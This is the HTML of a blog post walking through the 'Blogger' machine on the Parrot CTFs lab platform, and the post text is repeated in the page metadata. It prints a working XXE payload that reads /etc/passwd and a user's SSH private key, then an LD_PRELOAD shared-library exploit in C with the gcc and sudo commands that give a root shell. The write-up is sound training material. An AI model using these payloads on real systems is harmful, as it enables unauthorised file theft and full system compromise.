<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="description" content="ü¶ú Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag chal..."> <link type="application/atom+xml" rel="alternate" href="https://fmf-x0.github.io/feed.xml" title="FmF" /> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>Blogger | FmF</title> <meta name="generator" content="Jekyll v4.3.2" /> <meta property="og:title" content="Blogger" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="ü¶ú Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is a medium difficulty machine that exploits a XXE vulnerability and a dynamic linker hijacking with LD_Preload to gain root privileges. Content: Enumeration XXE Privilege escalation Enumeration üîé: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let‚Äôs go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.12 -oN allPorts -p- ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports. --open ‚Äì&gt; It will only report open ports. -sS ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000. -n ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v ‚Äì&gt; It will be verbose in its output. -Pn ‚Äì&gt; This option skips the host discovery stage. -oN ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù. We find out the following open ports: Let‚Äôs take a look at what the page has. Let‚Äôs take a look at what the page has. Well, we can‚Äôt see any of the posts because we get a 404 error, but we can see something interesting, a search button. XXE üíâ: Let‚Äôs take a closer look at sending a request, intercepting it with Burp Suite, and sending the request to Repeater for further analysis. I tried SQL injection payloads, but they didn‚Äôt work. So, I tried different combinations of other payloads and saw this interesting response. Basically, our input is being placed as a XML structure, sooo maybe a XXE (XML External Entity) injection?? let‚Äôs check it out. We can search for payloads in PayloadAllTheThings and I used the clasic XXE to retrieve files. &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt; IMPORTANT: You need to url encode the ampersand (&amp;) cause if you don‚Äôt, it will not work. It should be %26. It works, now searching for the word bash we can see two users jimmy and root. Now we can search for configuration files, enumerate internal ports, and so on. But let‚Äôs focus on enumerating the web page more. We can do fuzzing to the web page to search for directories with tools like: gobuster, wfuzz, ffuf, dirsearch‚Ä¶ but I am going to use dirsearch in this case. dirsearch -u http://10.14.0.12/ And we found the /management directory: We found this note in: /management/admins/temp We found this other note in: /management/employees/jimmy the same user that we saw earlier. A id_rsa file in /home/jimmy/ssh/id_rsa.bak?? üò≥, let‚Äôs try to search the file with the XXE vulnerability. Well with this we can log to the system as the user jimmy with ssh, copy the id_rsa text of burpsuite, put it in a file and change the permissions of the file to 400 with chmod 400 id_rsa, and now connect with it: ssh -i id_rsa jimmy@10.14.0.12 Now that we are inside the machine you need to do one thing to ensure smooth operation: export TERM=xterm This will allow us to clean the screen with ctrl + l. Now we can see the flag üéâ. Privilege escalation üö©: We need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation techniques check here. We can see something interesting: env_keep+=LD_PRELOAD. A quick search in Google tells us that we can escalate privileges with it. We can go to /tmp directory and create a exploit like this: #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } Save the file as whatever.c and to compile it with: gcc -fPIC -shared -o whatever.so whatever.c -nostartfiles This will create a whatever.so file that we need it to execute: sudo LD_PRELOAD=/tmp/whatever.so /usr/bin/ping And now we are root :) Hope you like it and learn something new :)" /> <meta property="og:description" content="ü¶ú Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is a medium difficulty machine that exploits a XXE vulnerability and a dynamic linker hijacking with LD_Preload to gain root privileges. Content: Enumeration XXE Privilege escalation Enumeration üîé: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let‚Äôs go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.12 -oN allPorts -p- ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports. --open ‚Äì&gt; It will only report open ports. -sS ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000. -n ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v ‚Äì&gt; It will be verbose in its output. -Pn ‚Äì&gt; This option skips the host discovery stage. -oN ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù. We find out the following open ports: Let‚Äôs take a look at what the page has. Let‚Äôs take a look at what the page has. Well, we can‚Äôt see any of the posts because we get a 404 error, but we can see something interesting, a search button. XXE üíâ: Let‚Äôs take a closer look at sending a request, intercepting it with Burp Suite, and sending the request to Repeater for further analysis. I tried SQL injection payloads, but they didn‚Äôt work. So, I tried different combinations of other payloads and saw this interesting response. Basically, our input is being placed as a XML structure, sooo maybe a XXE (XML External Entity) injection?? let‚Äôs check it out. We can search for payloads in PayloadAllTheThings and I used the clasic XXE to retrieve files. &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt; IMPORTANT: You need to url encode the ampersand (&amp;) cause if you don‚Äôt, it will not work. It should be %26. It works, now searching for the word bash we can see two users jimmy and root. Now we can search for configuration files, enumerate internal ports, and so on. But let‚Äôs focus on enumerating the web page more. We can do fuzzing to the web page to search for directories with tools like: gobuster, wfuzz, ffuf, dirsearch‚Ä¶ but I am going to use dirsearch in this case. dirsearch -u http://10.14.0.12/ And we found the /management directory: We found this note in: /management/admins/temp We found this other note in: /management/employees/jimmy the same user that we saw earlier. A id_rsa file in /home/jimmy/ssh/id_rsa.bak?? üò≥, let‚Äôs try to search the file with the XXE vulnerability. Well with this we can log to the system as the user jimmy with ssh, copy the id_rsa text of burpsuite, put it in a file and change the permissions of the file to 400 with chmod 400 id_rsa, and now connect with it: ssh -i id_rsa jimmy@10.14.0.12 Now that we are inside the machine you need to do one thing to ensure smooth operation: export TERM=xterm This will allow us to clean the screen with ctrl + l. Now we can see the flag üéâ. Privilege escalation üö©: We need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation techniques check here. We can see something interesting: env_keep+=LD_PRELOAD. A quick search in Google tells us that we can escalate privileges with it. We can go to /tmp directory and create a exploit like this: #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } Save the file as whatever.c and to compile it with: gcc -fPIC -shared -o whatever.so whatever.c -nostartfiles This will create a whatever.so file that we need it to execute: sudo LD_PRELOAD=/tmp/whatever.so /usr/bin/ping And now we are root :) Hope you like it and learn something new :)" /> <link rel="canonical" href="https://fmf-x0.github.io/parrot-ctf/Blogger" /> <meta property="og:url" content="https://fmf-x0.github.io/parrot-ctf/Blogger" /> <meta property="og:site_name" content="FmF" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2023-08-14T00:00:00-05:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Blogger" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-08-14T00:00:00-05:00","datePublished":"2023-08-14T00:00:00-05:00","description":"ü¶ú Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is a medium difficulty machine that exploits a XXE vulnerability and a dynamic linker hijacking with LD_Preload to gain root privileges. Content: Enumeration XXE Privilege escalation Enumeration üîé: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let‚Äôs go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.12 -oN allPorts -p- ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports. --open ‚Äì&gt; It will only report open ports. -sS ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000. -n ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v ‚Äì&gt; It will be verbose in its output. -Pn ‚Äì&gt; This option skips the host discovery stage. -oN ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù. We find out the following open ports: Let‚Äôs take a look at what the page has. Let‚Äôs take a look at what the page has. Well, we can‚Äôt see any of the posts because we get a 404 error, but we can see something interesting, a search button. XXE üíâ: Let‚Äôs take a closer look at sending a request, intercepting it with Burp Suite, and sending the request to Repeater for further analysis. I tried SQL injection payloads, but they didn‚Äôt work. So, I tried different combinations of other payloads and saw this interesting response. Basically, our input is being placed as a XML structure, sooo maybe a XXE (XML External Entity) injection?? let‚Äôs check it out. We can search for payloads in PayloadAllTheThings and I used the clasic XXE to retrieve files. &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt; IMPORTANT: You need to url encode the ampersand (&amp;) cause if you don‚Äôt, it will not work. It should be %26. It works, now searching for the word bash we can see two users jimmy and root. Now we can search for configuration files, enumerate internal ports, and so on. But let‚Äôs focus on enumerating the web page more. We can do fuzzing to the web page to search for directories with tools like: gobuster, wfuzz, ffuf, dirsearch‚Ä¶ but I am going to use dirsearch in this case. dirsearch -u http://10.14.0.12/ And we found the /management directory: We found this note in: /management/admins/temp We found this other note in: /management/employees/jimmy the same user that we saw earlier. A id_rsa file in /home/jimmy/ssh/id_rsa.bak?? üò≥, let‚Äôs try to search the file with the XXE vulnerability. Well with this we can log to the system as the user jimmy with ssh, copy the id_rsa text of burpsuite, put it in a file and change the permissions of the file to 400 with chmod 400 id_rsa, and now connect with it: ssh -i id_rsa jimmy@10.14.0.12 Now that we are inside the machine you need to do one thing to ensure smooth operation: export TERM=xterm This will allow us to clean the screen with ctrl + l. Now we can see the flag üéâ. Privilege escalation üö©: We need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation techniques check here. We can see something interesting: env_keep+=LD_PRELOAD. A quick search in Google tells us that we can escalate privileges with it. We can go to /tmp directory and create a exploit like this: #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } Save the file as whatever.c and to compile it with: gcc -fPIC -shared -o whatever.so whatever.c -nostartfiles This will create a whatever.so file that we need it to execute: sudo LD_PRELOAD=/tmp/whatever.so /usr/bin/ping And now we are root :) Hope you like it and learn something new :)","headline":"Blogger","mainEntityOfPage":{"@type":"WebPage","@id":"https://fmf-x0.github.io/parrot-ctf/Blogger"},"url":"https://fmf-x0.github.io/parrot-ctf/Blogger"}</script> <!-- End Jekyll SEO tag --> <link rel="shortcut icon" href="/favicon.ico" type="image/icon"> <link rel="icon" href="/favicon.ico" type="image/icon"> <!-- stylesheets --> <link rel="stylesheet" type="text/css" href="/assets/css/base.css"> <link rel="stylesheet" type="text/css" href="/assets/css/simplePagination.css"> <link rel="stylesheet" type="text/css" href="/assets/css/highlight-theme.css"> <link rel="stylesheet" type="text/css" href="/assets/css/rouge-code.css"> <link rel="stylesheet" type="text/css" href="/assets/css/post.css"> <!-- javascripts --> <script type="text/javascript" src="/assets/js/jquery.js"></script> <!--[if lt IE 9]> <script src="/assets/js/html5shiv.js"></script> <![endif]--> </head> <!-- bare layout means not header and footer like resume --> <body> <header id="l-header"> <div class="container"> <div class="row navicon"> <a href=""><i class="fa fa-navicon"></i></a> </div> <div class="row navbar"> <nav class="col-lg-8 col-md-8 col-xs-12"> <ul class="row"> <li class="col-lg-3"><a href="/">HOME</a></li> <li class="col-lg-3"> <ul class="subnav"> <a href="javascript:void(0)">POST</a> <li><a href="/category">CATEGORY</a></li> <li><a href="/tag">TAG</a></li> </ul> </li> <li class="col-lg-3"><a href="/about">ABOUT</a></li> </ul> </nav> <div class="search col-lg-4 col-md-4 col-xs-12"> <form> <label for="search"></label> <input id="search-input" name="serach" type="text" placeholder="Search Blog Posts..."> <i class="fa fa-search"></i> </form> </div> </div> </div> </header> <section id="l-main"> <div class="container"> <div id="search-result-wrapper" class="hidden"> <h3>Search Results:</h3> <div id="search-result"></div> </div> <style> #search-result-wrapper { font-size: 2rem; background-color: #eee; padding: 5rem; padding-left: 31rem; margin-top: 1rem; margin-bottom: 1rem; box-shadow: 0 0 10px #999; border-radius: 5px; background: white; } #search-result { padding-left: 3rem; } @media (max-width: 1200px) { #search-result-wrapper { font-size: 1.7rem; padding: 2rem; } #search-result { padding-left: 1rem; } } @media (max-width: 768px) { #search-result-wrapper { margin-top: 24rem !important; } } </style> <script> $(document).ready(function() { input = $("#search-input"); wrapper = $("#search-result-wrapper"); wrapper.hide(); wrapper.removeClass("hidden"); input.on("keyup change", function() { if (! input.val()) { wrapper.slideUp("ease"); } else { wrapper.slideDown("ease"); } }); }); </script> <script src="/assets/js/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-result'), json: "/search.json" }); </script> <div class="row"> <div id="markdown-container" class="col-lg-12"> <header> <p id="post-title">Blogger</p> <ul class="tags clearfix"> <li><i class="fa fa-tag"></i> Parrot-CTF</li> <li><i class="fa fa-tag"></i> Easy</li> </ul> </header> <p><img src="/assets/img/blogger/1.png" width="800" /></p> <p><a href="https://parrot-ctfs.com/">ü¶ú Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p> <p>This is a medium difficulty machine that exploits a XXE vulnerability and a dynamic linker hijacking with LD_Preload to gain root privileges.</p> <h1 id="content">Content:</h1> <ul> <li><a href="#enumeration-">Enumeration</a></li> <li><a href="#xxe-">XXE</a></li> <li><a href="#privilege-escalation-">Privilege escalation</a></li> </ul> <h1 id="enumeration-">Enumeration üîé:</h1> <p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p> <p><img src="/assets/img/blogger/2.png" width="600" /></p> <p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p> <p>Now, let‚Äôs go with an nmap scan to view the open ports.</p> <p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.12 -oN allPorts</code></p> <p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p> <p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p> <p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p> <p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p> <p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p> <p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p> <p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p> <p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p> <p>We find out the following open ports:</p> <p><img src="/assets/img/blogger/3.png" width="600" /></p> <p>Let‚Äôs take a look at what the page has.</p> <p><img src="/assets/img/blogger/3.png" width="600" /></p> <p>Let‚Äôs take a look at what the page has.</p> <p><img src="/assets/img/blogger/4.png" width="600" /></p> <p>Well, we can‚Äôt see any of the posts because we get a 404 error, but we can see something interesting, a search button.</p> <h1 id="xxe-">XXE üíâ:</h1> <p>Let‚Äôs take a closer look at sending a request, intercepting it with Burp Suite, and sending the request to Repeater for further analysis.</p> <p><img src="/assets/img/blogger/5.png" width="600" /></p> <p>I tried SQL injection payloads, but they didn‚Äôt work. So, I tried different combinations of other payloads and saw this interesting response.</p> <p><img src="/assets/img/blogger/6.png" width="600" /></p> <p>Basically, our input is being placed as a XML structure, sooo maybe a <a href="https://portswigger.net/web-security/xxe">XXE (XML External Entity)</a> injection?? let‚Äôs check it out.</p> <p>We can search for payloads in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe">PayloadAllTheThings</a> and I used the clasic XXE to retrieve files.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;
</code></pre></div></div> <p><a>IMPORTANT</a>: You need to url encode the ampersand (<code class="language-plaintext highlighter-rouge">&amp;</code>) cause if you don‚Äôt, it will not work. It should be <code class="language-plaintext highlighter-rouge">%26</code>.</p> <p>It works, now searching for the word <a>bash</a> we can see two users <code class="language-plaintext highlighter-rouge">jimmy</code> and <code class="language-plaintext highlighter-rouge">root</code>.</p> <p>Now we can search for configuration files, enumerate internal ports, and so on. But let‚Äôs focus on enumerating the web page more.</p> <p>We can do fuzzing to the web page to search for directories with tools like: <code class="language-plaintext highlighter-rouge">gobuster</code>, <code class="language-plaintext highlighter-rouge">wfuzz</code>, <code class="language-plaintext highlighter-rouge">ffuf</code>, <code class="language-plaintext highlighter-rouge">dirsearch</code>‚Ä¶ but I am going to use dirsearch in this case.</p> <p><code class="language-plaintext highlighter-rouge">dirsearch -u http://10.14.0.12/</code></p> <p>And we found the <code class="language-plaintext highlighter-rouge">/management</code> directory:</p> <p><img src="/assets/img/blogger/7.png" width="600" /></p> <p>We found this note in: <code class="language-plaintext highlighter-rouge">/management/admins/temp</code></p> <p><img src="/assets/img/blogger/8.png" width="600" /></p> <p>We found this other note in: /management/employees/jimmy the same user that we saw earlier.</p> <p><img src="/assets/img/blogger/9.png" width="600" /></p> <p>A id_rsa file in <code class="language-plaintext highlighter-rouge">/home/jimmy/ssh/id_rsa.bak</code>?? üò≥, let‚Äôs try to search the file with the XXE vulnerability.</p> <p><img src="/assets/img/blogger/10.png" width="600" /></p> <p>Well with this we can log to the system as the user jimmy with <code class="language-plaintext highlighter-rouge">ssh</code>, copy the id_rsa text of burpsuite, put it in a file and change the permissions of the file to <code class="language-plaintext highlighter-rouge">400</code> with <code class="language-plaintext highlighter-rouge">chmod 400 id_rsa</code>, and now connect with it:</p> <p><code class="language-plaintext highlighter-rouge">ssh -i id_rsa jimmy@10.14.0.12</code></p> <p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p> <ol> <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li> </ol> <p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p> <p><img src="/assets/img/blogger/11.png" width="300" /></p> <p>Now we can see the flag üéâ.</p> <h1 id="privilege-escalation-">Privilege escalation üö©:</h1> <p>We need to enumerate the system to find a way to escalate privileges.</p> <p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p> <p>More info about privilege escalation techniques check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here</a>.</p> <p><img src="/assets/img/blogger/12.png" width="600" /></p> <p>We can see something interesting: <a>env_keep+=LD_PRELOAD</a>.</p> <p>A quick search in Google tells us that we can escalate privileges with it.</p> <p>We can go to <code class="language-plaintext highlighter-rouge">/tmp</code> directory and create a exploit like this:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
</code></pre></div></div> <p>Save the file as <code class="language-plaintext highlighter-rouge">whatever.c</code> and to compile it with:</p> <p><code class="language-plaintext highlighter-rouge">gcc -fPIC -shared -o whatever.so whatever.c -nostartfiles</code></p> <p>This will create a <code class="language-plaintext highlighter-rouge">whatever.so</code> file that we need it to execute:</p> <p><code class="language-plaintext highlighter-rouge">sudo LD_PRELOAD=/tmp/whatever.so /usr/bin/ping</code></p> <p>And now we are root :)</p> <p><img src="/assets/img/blogger/13.png" width="200" /></p> <p>Hope you like it and learn something new :)</p> </div> </div> </div> </section> <style> footer { text-align: center; padding: 20px; /* Optional: Add padding for spacing */ color: #fff; /* Optional: Set text color */ } </style> <footer> <h3>Made with ‚ù§Ô∏è by <span style="color: #cf0;">FmF</span></h3> </footer> </body> </html>
